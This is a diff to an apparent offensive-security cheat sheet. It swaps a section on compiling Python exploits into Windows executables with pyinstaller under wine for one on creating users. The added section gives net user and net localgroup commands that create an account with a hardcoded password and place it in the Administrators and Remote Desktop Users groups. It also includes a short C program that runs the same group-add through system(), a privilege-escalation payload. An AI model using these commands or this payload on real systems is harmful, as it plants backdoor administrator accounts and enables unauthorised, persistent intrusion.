@@ -231,13 +231,23 @@ run post/windows/manage/enable_rdp
 https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/ 
 
 ###################
-# Python exploits #
+# Creating users  #
 ###################
 
-Compiling Python Exploits for Windows on Linux 
-install pyinstaller of windows with wine on Kali and then
-wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
-run `pyinstaller` located under the same directory as Python scripts
-wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py
-Execute with wine
-wine ~/.wine/drive_c/dist/HelloWorld.exe
+- CMD
+net user /add rosonsec P@ssw0rd
+net localgroup Administrators /add rosonsec
+# probably not needed:
+net localgroup "Remote Desktop Users" /add rosonsec
+
+- useradd.c
+#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+int main ()
+{
+  int i;
+  i=system ("net localgroup administrators rosonsec /add");
+  return 0;
+}
+
+
+
